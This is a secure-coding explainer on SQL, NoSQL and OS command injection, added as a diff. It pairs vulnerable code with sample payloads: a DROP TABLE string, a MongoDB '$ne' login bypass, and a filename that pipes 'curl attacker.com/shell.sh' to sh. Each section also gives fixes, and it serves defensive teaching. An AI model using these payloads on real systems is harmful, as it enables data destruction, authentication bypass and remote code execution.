@@ -1,0 +1,152 @@
+🔥 1️⃣️“If we use prepared statements everywhere, can SQL injection still happen?”?”
+🏗️ Architecture
+User → API → SQL database (e.g., MySQL)
+Developer uses parameterized queries:
+SELECT * FROM users WHERE username = ?;
+Safe, right?
+Mostly.
+But look at this:
+query = "SELECT * FROM users ORDER BY " + request.args["sort"]
+They only parameterized WHERE clauses.
+
+💣 What’s happening internally?
+Prepared statements protect data values, not SQL keywords, table names, column names, or operators.
+If attacker supplies:
+sort = username DESC; DROP TABLE users; --
+The final query becomes:
+SELECT * FROM users ORDER BY username DESC; DROP TABLE users; --
+
+Database parses full string before execution.
+Boom.
+
+🧠 Key Insight
+Prepared statements do NOT protect:
+	• ORDER BY
+	• LIMIT
+	• Table names
+	• Column names
+	• Entire dynamic query construction
+They only protect bound parameters.
+
+🛡️ Proper Mitigation
+	• Never concatenate SQL fragments.
+	• Use strict allowlists:
+
+if sort not in ["username", "email", "created_at"]:
+    reject()
+
+Summary:
+	SQL injection is about mixing code and data.
+	Prepared statements separate them — but only where used.
+
+🔥 2️⃣️“Why does NoSQL injection happen even though there’s no SQL?”?”
+🏗️ Architecture
+User → API → MongoDB
+Developer writes:
+db.users.find({
+  username: req.body.username,
+  password: req.body.password
+})
+Looks clean.
+
+💣 What attacker sends
+Instead of:
+{
+  "username": "admin",
+  "password": "password123"
+}
+
+Attacker sends:
+{
+  "username": "admin",
+  "password": { "$ne": null }
+}
+
+🧠 What Happens Internally?
+MongoDB interprets JSON as query operators.
+$ne = not equal.
+
+Query becomes:
+Find user where:
+username = admin
+AND password != null
+Authentication bypass.
+No password needed.
+
+💡 Why This Happens
+Developer assumes input is a string.
+But MongoDB treats JSON objects as query syntax.
+The database language is JSON itself.
+Attacker injects operators.
+
+🛡️ Fix
+Force types before query:
+
+if (typeof req.body.password !== "string") reject();
+Or explicitly wrap values:
+
+db.users.find({
+  username: String(req.body.username),
+  password: String(req.body.password)
+})
+
+🔥 3️⃣️“Why is escaping shell arguments NOT enough for OS Command Injection?”?”
+🏗️ Architecture
+User uploads file → Backend scans with antivirus:
+
+os.system("clamscan " + filename)
+Developer fixes it:
+
+os.system("clamscan " + shlex.quote(filename))
+They feel safe.
+
+💣 Attack
+Attacker uploads file named:
+file.txt; curl attacker.com/shell.sh | sh
+If quoting is done incorrectly or if shell is still invoked:
+The shell interprets:
+	• ;
+	• &&
+	• |
+	• backticks
+	• $()
+Because os.system() invokes /bin/sh.
+
+🧠 What’s Actually Happening?
+When using:
+os.system()
+The command is passed to a shell interpreter.
+Shell parses metacharacters.
+Even if escaping is imperfect — attacker wins.
+
+🛡️ Real Fix
+Never invoke shell.
+Use direct system calls:
+subprocess.run(["clamscan", filename], shell=False)
+Now:
+	• No shell parsing
+	• No metacharacter interpretation
+	• Arguments passed directly
+
+Summary:
+	OS command injection is shell injection.
+	Remove the shell — remove the vulnerability class.
+
+
+
+
+🧠 Master Mental Model for All Injection Types
+All injection vulnerabilities follow the same law:
+
+1. Application builds a command/query as a string
+2. User input is concatenated into it
+3. That string is interpreted by another engine
+4. Engine executes attacker-controlled instructions
+The interpreter might be:
+	• SQL engine → SQL injection
+	• MongoDB engine → NoSQL injection
+	• Shell → OS command injection
+	• Template engine → SSTI
+Same root cause:
+Code + Data mixed before interpretation.
+
